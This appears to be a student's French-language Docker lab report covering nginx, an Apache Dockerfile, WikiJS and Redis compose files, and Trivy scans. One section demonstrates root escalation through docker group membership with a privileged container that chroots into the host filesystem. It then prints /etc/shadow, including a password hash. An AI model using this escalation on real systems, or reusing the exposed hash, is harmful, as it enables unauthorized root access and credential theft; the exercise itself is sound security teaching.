# TP1

🌞 **Installer Docker sur la machine**

- en suivant [la doc officielle](https://docs.docker.com/engine/install/)
- démarrer le service `docker` avec une commande `systemctl`
- ajouter votre utilisateur au groupe `docker`
  - cela permet d'utiliser Docker sans avoir besoin de l'identité de `root`
  - avec la commande : `sudo usermod -aG docker $(whoami)`
  - déconnectez-vous puis relancez une session pour que le changement prenne effet

**Commande docker run**s
```
sudo docker run --name web -d -v $(pwd)/web/index.html:/usr/share/nginx/html/index.html -v $(pwd)/conf/tp1.conf:/etc/nginx/conf.d/tp1.conf -p 8080:80 snginx
```

**Conf file**
```
server {
  # on définit le port où NGINX écoute dans le conteneur
  listen 8080;

  # on définit le chemin vers la racine web
  # dans ce dossier doit se trouver un fichier index.html
  root /usr/share/nginx/html;
}
```

🌞 **Construire votre propre image**

- image de base (celle que vous voulez : debian, alpine, ubuntu, etc.)
  - une image du Docker Hub
  - qui ne porte aucune application par défaut
- vous ajouterez
  - mise à jour du système
  - installation de Apache (pour les systèmes debian, le serveur Web apache s'appelle `apache2` et non pas `httpd` comme sur Rocky)
  - page d'accueil Apache HTML personnalisée

**dockerfile**
```
FROM ubuntu

RUN apt-get update && apt-get upgrade -y

RUN apt install -y apache2

CMD ["apache2ctl", "-D", "FOREGROUND"]
```

On build l'image avec `sudo docker build . -t dockerfile`

Et on run avec `sudo docker run -d -p 8888:80 --name my_own_ubuntu -v /home/antna/travail/index.html:/var/www/html/index.html dockerfile`

🌞 **Installez un WikiJS** en utilisant Docker

- WikiJS a besoin d'une base de données pour fonctionner
- il faudra donc deux conteneurs : un pour WikiJS et un pour la base de données
- référez-vous à la doc officielle de WikiJS, c'est tout guidé

**File docker-compose.yml**

```
version: "3"
services:

  db:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: wiki
      POSTGRES_PASSWORD: wikijsrocks
      POSTGRES_USER: wikijs
    logging:
      driver: "none"
    restart: unless-stopped
    volumes:
      - db-data:/var/lib/postgresql/data

  wiki:
    image: ghcr.io/requarks/wiki:2
    depends_on:
      - db
    environment:
      DB_TYPE: postgres
      DB_HOST: db
      DB_PORT: 5432
      DB_USER: wikijs
      DB_PASS: wikijsrocks
      DB_NAME: wiki
    restart: unless-stopped
    ports:
      - "80:3000"

volumes:
  db-data:
  ```

  ![Wkijs create home page](/wikijs.png "Titre de l'image").


🌞 **Vous devez :**

- construire une image qui
  - contient `python3`
  - contient l'application et ses dépendances
  - lance l'application au démarrage du conteneur

```
FROM ubuntu

RUN apt update -y

RUN apt-get install -y python3 git python3-pip

RUN git clone https://github.com/antmrlt/python-app.git

WORKDIR /python-app

RUN pip3 install -r requirements

EXPOSE 8888

RUN chmod +x app.py

CMD ["python3", "app.py"]
```
On build grace à `docker build . -t pythonapp`

- écrire un `docker-compose.yml`
  - lance l'application
  - lance un Redis
    - utilise l'image de *library*
    - a un alias `db`

```
version: '3'

services:
  python-app:
    build:
      context: .
    image: pythonapp
    container_name: python-app-container
    restart: always
    ports:
      - "8888:8888"
    depends_on:
      - redis
    networks:
      - my-network

  redis:
    image: "redis:latest"
    container_name: redis-container
    restart: always
    ports:
      - "6379:6379"
    networks:
      - my-network

networks:
  my-network:
    driver: bridge
```

🌞 Prouvez que vous pouvez devenir root
- en étant membre du groupe docker

- sans taper aucune commande sudo ou su ou ce genre de choses
normalement, une seule commande docker run suffit
pour prouver que vous êtes root, plein de moyens possibles
  - par exemple un cat /etc/shadow qui contient les hash des mots de passe de la machine hôte

`docker run -it --privileged --net host --ipc=host -v /:/host alpine chroot /host`

```
root@antnaserv:/# cat /etc/shadow
root:*:19579:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
...
fwupd-refresh:*:19579:0:99999:7:::
usbmux:*:19675:0:99999:7:::
antna:$6$rLoAV.QR1JtPPWax$qMiioqI8AUgOeZ/MMM7UKtxlJj4TgPyn/NAYN5/W3nGRLf1IVYbGkAn4kfLEVd6ra/icAXxDjiOUsvNnzLddU/:19675:0:99999:7:::
lxd:!:19675::::::
sshd:*:19676:0:99999:7:::
```

🌞 Utilisez Trivy

- effectuez un scan de vulnérabilités sur des images précédemment mises en oeuvre :

  - celle de WikiJS que vous avez build
  - celle de sa base de données
  - l'image de Apache que vous avez build
  - l'image de NGINX officielle utilisée dans la première partie

On utilise la commande `trivy image <subject>`